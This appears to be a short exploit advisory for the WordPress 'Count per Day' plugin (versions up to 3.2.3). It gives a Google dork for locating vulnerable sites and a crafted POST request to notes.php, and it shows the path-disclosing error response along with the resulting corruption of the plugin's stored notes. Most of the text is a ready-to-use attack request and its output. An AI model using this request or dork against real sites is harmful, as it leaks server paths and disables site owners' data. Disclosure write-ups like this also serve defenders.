Subject: WordPress Counter per Day plugin <= 3.2.3. Path
 Disclosure and Denial-Of-Service (DOS) and WordPress Counter per Day plugin
 <= 3.2.5. Path Disclosure

# Exploit Title: WordPress Counter per Day plugin <= 3.2.3. Path
Disclosure and Denial-Of-Service (DOS)
# Date: 2013-03-04
# Google Dork:inurl:/wp-content/plugins/count-per-day
#
# Author: alejandr0.m0f0
#
# versions: 3.2.3(tested)
#
# Impact:
#  -- path disclosure
#  -- DOS of the notes functionality of the count per day plugin
---------------------
HTTP request: #1

POST
/wp-content/plugins/count-per-day/notes.php

month=3&year=2013&date='\xbf\'"('&note=qwdqwd&new=%2B
---------------------
HTTP response:

Fatal error: [] operator not supported for strings in
.../websites/wordpress/wp-content/plugins/count-per-day/notes.php on
line 26
---------------------
--> PATH DISCLOSURE
once the previous request is performed, admin is unable to save notes
anymore, nor view the previously saved ones.

Notes
Warning: Invalid argument supplied for foreach() in
.../websites/wordpress/wp-content/plugins/count-per-day/notes.php on
line 85
---------------------
--> DENIAL OF SERVICE, unability to enter or view notes anymore
--> the structure of the wordpress stored object (wp_options WHERE
option_name='count_per_day_notes') is corrupted. did not take time
analyzing if this could leak to php code execution. this is unlikely
to be achieved.
